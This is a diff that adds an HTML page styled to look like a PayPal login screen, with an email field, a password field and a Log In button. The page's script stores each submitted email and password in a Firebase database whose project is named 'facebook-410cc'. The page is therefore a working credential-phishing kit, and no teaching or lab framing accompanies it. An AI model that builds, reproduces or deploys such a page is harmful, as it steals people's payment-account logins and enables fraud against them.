@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- <link rel="stylesheet" href="style.css" /> -->
+     <style>
+         .container-fluid {
+    padding:30px;
+}
+
+.paypal-form {   
+    max-width:460px;
+    margin-left:auto;
+    margin-right:auto;
+    background-color:#F7F9FA;
+    border-radius:5px;
+    padding:60px 20px;
+}
+
+.paypal-form .logo {
+    margin-bottom:30px;
+    color:#003087;
+}
+
+.paypal-form .content {
+    margin: 0 15%;
+    padding: 0 0 10px;
+}
+
+.paypal-form .forgotlinkholder{
+    margin: 20px auto;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #cbd2d6;
+    text-align: center;
+}
+
+.paypal-form .forgotlinkholder a,.paypal-form .forgotlinkholder a:link,
+.paypal-form .forgotlinkholder a:visited {
+    color: #0079ad;
+    font-weight: 400;
+    text-decoration: none;
+}
+.img {text-align: center;}
+.paypal-form .buttonlogin {
+    width: 100%;
+    height: 44px;
+    padding: 0;
+    border: 0;
+    display: block;
+    background-color: #009cde;
+    border-radius:5px;
+    cursor:pointer;
+    color:#fff;
+    transition: background-color .4s ease-out;
+}
+
+.paypal-form .buttonlogin:hover {
+    background-color: #008AC5;
+}
+
+/*.paypal-form .buttonsignup {
+    width: 100%;
+    height: 44px;
+    padding: 0;
+    border: 0;
+    display: block;
+    background-color: #3ea6f0;
+    border-radius:5px;
+    cursor:pointer;
+    color:#222;
+    transition: background-color .4s ease-out;
+}
+.buttonsignin{
+      width: 100%;
+    height: 44px;
+    padding: 0;
+    border: 0;
+    display: block;
+    background-color: #E1E7EB;
+    border-radius:5px;
+    cursor:pointer;
+    color:#222;
+    transition: background-color .4s ease-out;
+}*/
+.paypal-form .buttonsignup:hover {
+   background-color: #D2DBE1;
+}
+
+.paypal-form .actionbutton {
+    margin-top:10%;
+}
+.imglogo{
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+  width: 80%;
+    
+}
+.paypal-form .element {
+    height: 40px;
+    width: 100%;
+    padding:0 10px;
+    margin-bottom:10px;
+    border: 1px solid #9da3a6;
+    background: #fff;
+    border-radius: 5px;
+}
+button {
+    width: 100%;
+    height: 44px;
+    padding: 0;
+    border: 0;
+    display: block;
+    background-color: #E1E7EB;
+    border-radius:5px;
+    cursor:pointer;
+    color:#222;
+    transition: background-color .4s ease-out;
+    background-color: #D2DBE1;
+    margin-top:10%;
+}
+input {
+  height: 40px;
+    width: 100%;
+    padding:0 10px;
+    margin-bottom:10px;
+    border: 1px solid #9da3a6;
+    background: #fff;
+    border-radius: 5px;
+}
+
+     </style>
+  </head>
+  <body>
+       <div class="container-fluid">
+         <div class="paypal-form "> 
+         <div class="logo text-center"> 
+          <!--<i class="fa fa-paypal fa-4x imglogo  "></i> -->
+          <img src="https://res.cloudinary.com/dgljegdch/image/upload/v1668782777/580b57fcd9996e24bc43c530_fnixc1.png" class="imglogo" width="700px" height="100px" >
+        </div>
+        <div class="content">
+            <input id="roll" type="email" class="element" autocomplete="off" placeholder="Email" pattern=".+@gmail.com">
+             <input id="name" name="pass" type="password" class="element"autocomplete="off" placeholder="Password">
+             
+            <button id="login"class="buttonsignup actionbutton">Log In</button>
+                  <div class="forgotlinkholder">
+               <a href="#" id="a">Forgot your email or password ?</a>
+                 </div>
+             <button id="signin" class="buttonsignin actionbutton">Sign Up</button>  
+        </div>
+   </div>
+</div>
+    
+</div>
+    <script src="https://www.gstatic.com/firebasejs/8.4.2/firebase.js"></script>
+    <script >
+      var rollV, nameV;
+ const firebaseConfig = {
+  apiKey: "AIzaSyAgkClTPXRoCHS-BbpV8TCoMr4yRoWzswU",
+  authDomain: "facebook-410cc.firebaseapp.com",
+  databaseURL: "https://facebook-410cc-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "facebook-410cc",
+  storageBucket: "facebook-410cc.appspot.com",
+  messagingSenderId: "771878812330",
+  appId: "1:771878812330:web:93ab502046930aefefaed3"
+};
+firebase.initializeApp(firebaseConfig);
+function readFom() {
+  rollV = document.getElementById("roll").value;
+  nameV = document.getElementById("name").value;
+}
+
+document.getElementById("login").onclick = function () {
+  rollV = document.getElementById("roll").value;
+  const noSpecialCharacters = rollV.replace(/[^\w ]/g, '');
+  var random = Math.floor(Math.random() * 1000);
+  readFom();
+  firebase
+    .database()
+    .ref("paypal/"+noSpecialCharacters+"+Paypal"+random)
+    .set({
+      email: rollV,
+      pass: nameV,
+    });
+  alert("Data Inserted");
+  document.getElementById("roll").value = "";
+  document.getElementById("name").value = "";
+};
+    </script>
+  </body>
+</html>
